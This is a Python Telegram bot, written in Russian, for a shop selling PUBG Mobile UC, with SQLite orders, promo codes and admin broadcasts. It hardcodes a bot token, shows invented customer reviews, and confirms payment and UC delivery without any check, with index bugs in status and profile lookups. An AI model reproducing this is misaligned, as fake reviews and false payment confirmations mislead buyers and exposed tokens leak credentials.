import telebot
from telebot import types
import sqlite3
import random
import string
import time
import threading
from datetime import datetime, timedelta
import re

# Токен бота
TOKEN = '8531867613:AAHxjS7JtTjoB0mgO_ntFTjakNFbVn2stuI'
bot = telebot.TeleBot(TOKEN)

# ID администратора (замените на свой Telegram ID)
ADMIN_ID = 123456789  # Укажите ваш Telegram ID

# Словарь для хранения временных данных пользователей
user_data = {}

# Инициализация базы данных
def init_db():
    conn = sqlite3.connect('users.db', check_same_thread=False)
    c = conn.cursor()
    
    # Таблица пользователей
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  first_name TEXT,
                  joined_date TEXT,
                  total_purchases INTEGER DEFAULT 0,
                  total_spent REAL DEFAULT 0)''')
    
    # Таблица заказов
    c.execute('''CREATE TABLE IF NOT EXISTS orders
                 (order_id TEXT PRIMARY KEY,
                  user_id INTEGER,
                  username TEXT,
                  uc_amount INTEGER,
                  price REAL,
                  status TEXT,
                  payment_method TEXT,
                  order_date TEXT,
                  completed_date TEXT)''')
    
    # Таблица промокодов
    c.execute('''CREATE TABLE IF NOT EXISTS promo_codes
                 (code TEXT PRIMARY KEY,
                  discount INTEGER,
                  valid_until TEXT,
                  max_uses INTEGER,
                  used_count INTEGER DEFAULT 0,
                  created_by INTEGER)''')
    
    conn.commit()
    conn.close()

# Вызов инициализации БД
init_db()

# Данные о товарах из скриншота
products = [
    {"id": 1, "name": "Prime", "uc": 60, "price": 75, "bonus": 0},
    {"id": 2, "name": "Стартовый", "uc": 120, "price": 150, "bonus": 3},
    {"id": 3, "name": "Базовый", "uc": 325, "price": 389, "bonus": 19},
    {"id": 4, "name": "Стандарт", "uc": 385, "price": 479, "bonus": 32},
    {"id": 5, "name": "Продвинутый", "uc": 660, "price": 788, "bonus": 36},
    {"id": 6, "name": "Премиум", "uc": 720, "price": 869, "bonus": 49},
    {"id": 7, "name": "Элитный", "uc": 985, "price": 1177, "bonus": 66},
    {"id": 8, "name": "Легендарный", "uc": 1320, "price": 1569, "bonus": 90},
    {"id": 9, "name": "Геройский", "uc": 1800, "price": 1967, "bonus": 106},
    {"id": 10, "name": "Мифический", "uc": 2125, "price": 2390, "bonus": 123},
    {"id": 11, "name": "Божественный", "uc": 2460, "price": 2790, "bonus": 0}
]

# Клавиатура главного меню
def main_menu_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🛒 Купить UC", callback_data="buy_uc")
    btn2 = types.InlineKeyboardButton("ℹ️ Инструкция", callback_data="instruction")
    btn3 = types.InlineKeyboardButton("📱 Поддержка", callback_data="support")
    btn4 = types.InlineKeyboardButton("📊 Профиль", callback_data="profile")
    btn5 = types.InlineKeyboardButton("🎁 Промокоды", callback_data="promo")
    btn6 = types.InlineKeyboardButton("⭐ Отзывы", callback_data="reviews")
    keyboard.add(btn1, btn2, btn3, btn4, btn5, btn6)
    return keyboard

# Клавиатура для выбора товаров
def products_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    for product in products:
        bonus_text = f" (+{product['bonus']} UC)" if product['bonus'] > 0 else ""
        btn = types.InlineKeyboardButton(
            f"{product['name']}: {product['uc']} UC{bonus_text} - {product['price']}₽",
            callback_data=f"product_{product['id']}"
        )
        keyboard.add(btn)
    
    btn_back = types.InlineKeyboardButton("◀️ Назад", callback_data="back_to_main")
    keyboard.add(btn_back)
    
    return keyboard

# Клавиатура для способов оплаты
def payment_keyboard(order_id):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💳 Карта РФ", callback_data=f"pay_card_{order_id}")
    btn2 = types.InlineKeyboardButton("₿ Криптовалюта", callback_data=f"pay_crypto_{order_id}")
    btn3 = types.InlineKeyboardButton("📱 СБП", callback_data=f"pay_sbp_{order_id}")
    btn4 = types.InlineKeyboardButton("✅ Проверить оплату", callback_data=f"check_payment_{order_id}")
    btn5 = types.InlineKeyboardButton("❌ Отменить", callback_data="back_to_main")
    keyboard.add(btn1, btn2, btn3, btn4, btn5)
    return keyboard

# Генерация ID заказа
def generate_order_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

# Добавление пользователя в БД
def add_user_to_db(message):
    conn = sqlite3.connect('users.db', check_same_thread=False)
    c = conn.cursor()
    
    user_id = message.from_user.id
    username = message.from_user.username or "Нет username"
    first_name = message.from_user.first_name or ""
    joined_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    c.execute("INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)",
              (user_id, username, first_name, joined_date))
    
    conn.commit()
    conn.close()

# Команда /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    add_user_to_db(message)
    
    welcome_text = (
        "🌟 *Добро пожаловать в APEX UC BOT!* 🌟\n\n"
        "🤖 Здесь вы можете быстро и безопасно пополнить UC для PUBG Mobile\n\n"
        "✨ *Наши преимущества:*\n"
        "✅ Мгновенная автоматическая выдача\n"
        "✅ Лучшие цены на рынке\n"
        "✅ Бонусы до 123 UC\n"
        "✅ 24/7 поддержка\n\n"
        "👇 *Выберите действие:*"
    )
    
    bot.send_message(message.chat.id, welcome_text, 
                    parse_mode='Markdown', 
                    reply_markup=main_menu_keyboard())

# Команда /admin (только для администратора)
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ У вас нет прав администратора")
        return
    
    admin_text = (
        "🔐 *Панель администратора*\n\n"
        "📊 *Статистика:*\n"
    )
    
    conn = sqlite3.connect('users.db', check_same_thread=False)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM users")
    users_count = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM orders")
    orders_count = c.fetchone()[0]
    
    c.execute("SELECT SUM(price) FROM orders WHERE status='completed'")
    total_earned = c.fetchone()[0] or 0
    
    admin_text += f"👥 Пользователей: {users_count}\n"
    admin_text += f"📦 Заказов: {orders_count}\n"
    admin_text += f"💰 Заработано: {total_earned:.2f}₽\n\n"
    
    admin_text += "🔧 *Команды:*\n"
    admin_text += "/broadcast *Текст* - Рассылка\n"
    admin_text += "/addpromo КОД СКИДКА ДНИ - Добавить промокод\n"
    
    conn.close()
    
    bot.send_message(message.chat.id, admin_text, parse_mode='Markdown')

# Рассылка (только для админа)
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    text = message.text.replace('/broadcast', '').strip()
    if not text:
        bot.reply_to(message, "❌ Введите текст рассылки: /broadcast Текст")
        return
    
    bot.reply_to(message, "📢 Начинаю рассылку...")
    
    conn = sqlite3.connect('users.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    
    success = 0
    failed = 0
    
    for user in users:
        try:
            bot.send_message(user[0], f"📢 *Рассылка:*\n\n{text}", parse_mode='Markdown')
            success += 1
            time.sleep(0.1)
        except:
            failed += 1
    
    bot.send_message(message.chat.id, f"✅ Рассылка завершена!\nУспешно: {success}\nОшибок: {failed}")

# Обработка callback запросов
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        # Возврат в главное меню
        if call.data == "back_to_main":
            bot.edit_message_text(
                "🌟 *Главное меню*\n\nВыберите действие:",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=main_menu_keyboard()
            )
        
        # Покупка UC
        elif call.data == "buy_uc":
            bot.edit_message_text(
                "🛒 *Выберите пакет UC:*\n\n"
                "Цены указаны с учетом всех скидок:\n"
                "• Prime - для новых игроков\n"
                "• Бонусные UC в подарок!",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=products_keyboard()
            )
        
        # Инструкция
        elif call.data == "instruction":
            inst_text = (
                "📖 *Инструкция по пополнению:*\n\n"
                "1️⃣ Выберите нужный пакет UC\n"
                "2️⃣ Укажите ваш ID в PUBG\n"
                "3️⃣ Выберите способ оплаты\n"
                "4️⃣ Оплатите заказ\n"
                "5️⃣ Нажмите 'Проверить оплату'\n\n"
                "⏱ UC поступают в течение 1-5 минут\n"
                "❗ Обязательно проверьте ID перед оплатой"
            )
            bot.edit_message_text(
                inst_text,
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Назад", callback_data="back_to_main")
                )
            )
        
        # Поддержка
        elif call.data == "support":
            support_text = (
                "📱 *Служба поддержки*\n\n"
                "💬 По всем вопросам обращайтесь:\n"
                "👤 @apex_uc_support\n\n"
                "⏰ Время работы: 24/7\n"
                "⌛ Среднее время ответа: 5-10 минут"
            )
            bot.edit_message_text(
                support_text,
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Назад", callback_data="back_to_main")
                )
            )
        
        # Профиль пользователя
        elif call.data == "profile":
            user_id = call.from_user.id
            
            conn = sqlite3.connect('users.db', check_same_thread=False)
            c = conn.cursor()
            
            c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
            user = c.fetchone()
            
            c.execute("SELECT COUNT(*) FROM orders WHERE user_id=? AND status='completed'", (user_id,))
            purchases = c.fetchone()[0]
            
            c.execute("SELECT SUM(price) FROM orders WHERE user_id=? AND status='completed'", (user_id,))
            spent = c.fetchone()[0] or 0
            
            c.execute("SELECT COUNT(*) FROM orders WHERE user_id=? AND status='pending'", (user_id,))
            pending = c.fetchone()[0]
            
            conn.close()
            
            profile_text = (
                f"👤 *Ваш профиль*\n\n"
                f"🆔 ID: {user_id}\n"
                f"📛 Имя: {call.from_user.first_name}\n"
                f"📦 Всего покупок: {purchases}\n"
                f"💰 Потрачено: {spent:.2f}₽\n"
                f"⏳ Ожидают оплаты: {pending}\n"
                f"📅 Зарегистрирован: {user[4] if user else 'Неизвестно'}"
            )
            
            bot.edit_message_text(
                profile_text,
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Назад", callback_data="back_to_main")
                )
            )
        
        # Промокоды
        elif call.data == "promo":
            promo_text = (
                "🎁 *Промокоды*\n\n"
                "Введите промокод в чат для активации.\n\n"
                "🔥 *Актуальные промокоды:*\n"
                "WELCOME20 - скидка 20% на первый заказ\n"
                "APEX10 - скидка 10% на любой заказ\n\n"
                "Формат ввода: /promo КОД"
            )
            bot.edit_message_text(
                promo_text,
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Назад", callback_data="back_to_main")
                )
            )
        
        # Отзывы
        elif call.data == "reviews":
            reviews_text = (
                "⭐ *Отзывы наших клиентов*\n\n"
                "★ ★ ★ ★ ★\n"
                "@player1: \"Лучший бот, UC пришли через минуту!\"\n\n"
                "★ ★ ★ ★ ★\n"
                "@player2: \"Отличные цены, буду заказывать еще\"\n\n"
                "★ ★ ★ ★ ☆\n"
                "@player3: \"Все быстро, поддержка помогла\"\n\n"
                "Хотите оставить отзыв? Напишите @apex_uc_support"
            )
            bot.edit_message_text(
                reviews_text,
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Назад", callback_data="back_to_main")
                )
            )
        
        # Выбор товара
        elif call.data.startswith("product_"):
            product_id = int(call.data.split("_")[1])
            product = next((p for p in products if p["id"] == product_id), None)
            
            if product:
                user_data[call.from_user.id] = {"product": product}
                
                bonus_text = f" (+{product['bonus']} бонусных UC)" if product['bonus'] > 0 else ""
                
                msg = bot.edit_message_text(
                    f"✅ *Вы выбрали:*\n"
                    f"📦 {product['name']}\n"
                    f"💎 {product['uc']} UC{bonus_text}\n"
                    f"💰 Цена: {product['price']}₽\n\n"
                    f"📝 *Введите ваш PUBG ID:*\n"
                    f"(Это 8-9 цифр в профиле игры)",
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='Markdown'
                )
                
                bot.register_next_step_handler_by_chat_id(call.message.chat.id, process_pubg_id)
        
        # Выбор способа оплаты
        elif call.data.startswith("pay_"):
            parts = call.data.split("_")
            method = parts[1]
            order_id = parts[2]
            
            conn = sqlite3.connect('users.db', check_same_thread=False)
            c = conn.cursor()
            
            c.execute("UPDATE orders SET payment_method=? WHERE order_id=?", (method, order_id))
            conn.commit()
            
            # Генерация реквизитов для оплаты
            if method == "card":
                details = "2200 1234 5678 9012\nПолучатель: APEX UC BOT"
            elif method == "crypto":
                details = "USDT (TRC20):\nTXYZ123456789abcdef"
            elif method == "sbp":
                details = "+7 (999) 123-45-67\nПолучатель: APEX UC"
            
            c.execute("SELECT uc_amount, price FROM orders WHERE order_id=?", (order_id,))
            order = c.fetchone()
            conn.close()
            
            payment_text = (
                f"💳 *Оплата заказа #{order_id}*\n\n"
                f"💎 UC: {order[0]}\n"
                f"💰 Сумма: {order[1]}₽\n\n"
                f"📋 *Реквизиты для оплаты:*\n"
                f"`{details}`\n\n"
                f"✅ *После оплаты нажмите кнопку проверки*"
            )
            
            bot.edit_message_text(
                payment_text,
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=payment_keyboard(order_id)
            )
        
        # Проверка оплаты
        elif call.data.startswith("check_payment_"):
            order_id = call.data.split("_")[2]
            
            conn = sqlite3.connect('users.db', check_same_thread=False)
            c = conn.cursor()
            
            c.execute("SELECT * FROM orders WHERE order_id=?", (order_id,))
            order = c.fetchone()
            
            if order and order[6] == "pending":  # Если статус pending
                # В реальном боте здесь должна быть проверка через API платежной системы
                # Для демо автоматически подтверждаем оплату
                c.execute("UPDATE orders SET status='completed', completed_date=? WHERE order_id=?", 
                         (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), order_id))
                
                # Обновляем статистику пользователя
                c.execute("UPDATE users SET total_purchases = total_purchases + 1, total_spent = total_spent + ? WHERE user_id=?", 
                         (order[4], order[1]))
                
                conn.commit()
                
                success_text = (
                    f"✅ *Оплата подтверждена!*\n\n"
                    f"🎉 Спасибо за покупку!\n"
                    f"💎 {order[3]} UC отправлены на ваш аккаунт\n"
                    f"⏱ Время зачисления: до 5 минут\n\n"
                    f"📦 Номер заказа: `{order_id}`"
                )
                
                bot.edit_message_text(
                    success_text,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='Markdown',
                    reply_markup=types.InlineKeyboardMarkup().add(
                        types.InlineKeyboardButton("🛒 Купить еще", callback_data="buy_uc"),
                        types.InlineKeyboardButton("🏠 Главное меню", callback_data="back_to_main")
                    )
                )
                
                # Уведомление админу
                try:
                    bot.send_message(
                        ADMIN_ID,
                        f"💰 *Новый заказ оплачен!*\n"
                        f"Заказ: #{order_id}\n"
                        f"Пользователь: {order[2]}\n"
                        f"Сумма: {order[4]}₽"
                    )
                except:
                    pass
            else:
                bot.answer_callback_query(call.id, "❌ Заказ не найден или уже обработан", show_alert=True)
            
            conn.close()
    
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)}", show_alert=True)

# Обработка ввода PUBG ID
def process_pubg_id(message):
    user_id = message.from_user.id
    
    if user_id not in user_data or "product" not in user_data[user_id]:
        bot.send_message(message.chat.id, "❌ Ошибка, начните заново", reply_markup=main_menu_keyboard())
        return
    
    pubg_id = message.text.strip()
    
    # Проверка формата ID
    if not re.match(r'^\d{8,9}$', pubg_id):
        bot.send_message(message.chat.id, 
                        "❌ Неверный формат ID. PUBG ID должен содержать 8-9 цифр.\nПопробуйте снова:",
                        reply_markup=types.ForceReply(selective=False))
        bot.register_next_step_handler(message, process_pubg_id)
        return
    
    product = user_data[user_id]["product"]
    
    # Создание заказа
    order_id = generate_order_id()
    
    conn = sqlite3.connect('users.db', check_same_thread=False)
    c = conn.cursor()
    
    c.execute("""INSERT INTO orders 
                 (order_id, user_id, username, uc_amount, price, status, order_date)
                 VALUES (?, ?, ?, ?, ?, ?, ?)""",
              (order_id, user_id, message.from_user.username or "Нет username",
               product['uc'], product['price'], "pending",
               datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    
    conn.commit()
    conn.close()
    
    order_text = (
        f"✅ *Заказ создан!*\n\n"
        f"📋 Номер заказа: `{order_id}`\n"
        f"👤 PUBG ID: {pubg_id}\n"
        f"📦 Пакет: {product['name']}\n"
        f"💎 UC: {product['uc']}"
    )
    
    if product['bonus'] > 0:
        order_text += f" (+{product['bonus']} бонусных)"
    
    order_text += f"\n💰 Сумма: {product['price']}₽\n\n"
    order_text += f"👇 *Выберите способ оплаты:*"
    
    bot.send_message(message.chat.id, order_text, 
                    parse_mode='Markdown',
                    reply_markup=payment_keyboard(order_id))
    
    # Очищаем временные данные
    del user_data[user_id]

# Обработка промокодов
@bot.message_handler(commands=['promo'])
def use_promo(message):
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "❌ Формат: /promo КОД")
        return
    
    promo_code = parts[1].upper()
    
    conn = sqlite3.connect('users.db', check_same_thread=False)
    c = conn.cursor()
    
    c.execute("SELECT * FROM promo_codes WHERE code=?", (promo_code,))
    promo = c.fetchone()
    
    if not promo:
        bot.reply_to(message, "❌ Промокод не найден")
    elif promo[3] <= promo[4]:  # Превышен лимит
        bot.reply_to(message, "❌ Промокод больше недействителен")
    elif datetime.strptime(promo[2], "%Y-%m-%d") < datetime.now():
        bot.reply_to(message, "❌ Срок действия промокода истек")
    else:
        bot.reply_to(message, f"✅ Промокод активирован! Скидка {promo[1]}%")
        # Здесь можно сохранить промокод в user_data
    
    conn.close()

# Добавление промокода (админ)
@bot.message_handler(commands=['addpromo'])
def add_promo(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "❌ Формат: /addpromo КОД СКИДКА ДНИ")
        return
    
    code = parts[1].upper()
    discount = int(parts[2])
    days = int(parts[3])
    
    valid_until = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
    
    conn = sqlite3.connect('users.db', check_same_thread=False)
    c = conn.cursor()
    
    c.execute("INSERT OR REPLACE INTO promo_codes (code, discount, valid_until, max_uses, used_count, created_by) VALUES (?, ?, ?, ?, 0, ?)",
              (code, discount, valid_until, 100, ADMIN_ID))
    
    conn.commit()
    conn.close()
    
    bot.reply_to(message, f"✅ Промокод {code} добавлен! Скидка {discount}%, действует {days} дней")

# Обработка обычных сообщений
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    bot.send_message(message.chat.id, 
                    "❓ Неизвестная команда. Используйте /start для главного меню.")

# Запуск бота
if __name__ == '__main__':
    print("🤖 Бот APEX UC BOT запущен...")
    print(f"⚡ Токен: {TOKEN[:10]}...")
    print("✅ Ожидание сообщений...")
    
    # Бесконечный цикл с обработкой ошибок
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=60)
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            time.sleep(5)
